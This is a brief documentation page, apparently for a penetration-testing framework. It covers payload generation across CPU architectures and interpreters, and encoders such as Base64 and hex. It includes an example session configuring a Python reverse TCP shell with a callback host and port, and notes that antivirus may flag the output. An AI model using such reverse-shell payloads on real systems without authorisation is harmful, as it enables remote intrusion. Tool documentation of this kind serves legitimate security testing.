# Payloads and encoders

**Language:** English (en-US). **pt-BR:** [../pt-BR/09-payloads-e-encoders.md](../pt-BR/09-payloads-e-encoders.md)

## Payloads — `payloads/*`

Generate shellcode / one-liners: architectures (`armle`, `mipsbe`, `mipsle`, `x86`, `x64`) and `cmd/` interpreters (netcat, bash, python, …).

```text
use payloads/python/reverse_tcp
show options
set lhost 192.168.56.1
set lport 4444
run
```

Treat output as sensitive; AV/EDR may flag payloads.

## Encoders — `encoders/<language>/*`

Transform representations: Base64, hex, URL, ROT13, … for `python`, `php`, `perl`.

```text
use encoders/python/base64
show options
run
```

---

[Wiki hub](../README.md)
